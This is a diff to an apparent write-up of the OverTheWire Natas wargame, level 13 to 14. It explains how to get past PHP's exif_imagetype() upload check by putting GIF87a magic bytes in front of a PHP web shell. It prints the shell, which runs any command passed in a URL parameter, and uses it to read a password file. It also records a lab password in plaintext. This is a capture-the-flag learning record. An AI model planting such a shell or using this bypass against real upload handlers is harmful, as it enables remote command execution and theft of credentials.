@@ -307,13 +307,13 @@ if($key != "") {
 
 ## 13->14
 - http://natas13.natas.labs.overthewire.org/
-- `natas14:GIF87az3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`
+- `natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ`
 - New concept: "magic headers" aka [File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures?ref=learnhacking.io)
   - <img width="719" alt="Screenshot 2025-06-07 at 7 29 20 PM" src="https://github.com/user-attachments/assets/af158e1a-97e2-4f2d-859f-5b309b7d9530" />
 
 - They've tightened up security. "For security reasons, we now only accept image files!" The source code now uses [exif_imagetype()](https://www.php.net/manual/en/function.exif-imagetype.php?ref=learnhacking.io) to check if the uploaded file is an image or not. This PHP function reads the first few bytes of a file, sometimes known as “magic headers” to determine the file type. It won’t be fooled by just changing the file extension. If our file does not begin with the header bytes that indicate it actually is an image file, it will be rejected.
 - `Exif_imagetype() bypass`: Luckily, this is pretty easy to bypass. From the magic headers link above, we have a few different options, but it’s probably smart to stick with a more common filetype, GIF looks easy.
-- We can use our webshell from last level and append `GIF87a` in front, and execute the same steps to get `/etc/natas_webpass/natas14`
+- We can use our webshell from last level and append `GIF87a` in front, and execute the same steps to get `/etc/natas_webpass/natas14`, of note the output is prepended with `GIF87a`
 ```php
 # webshell2.php
 GIF87a<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
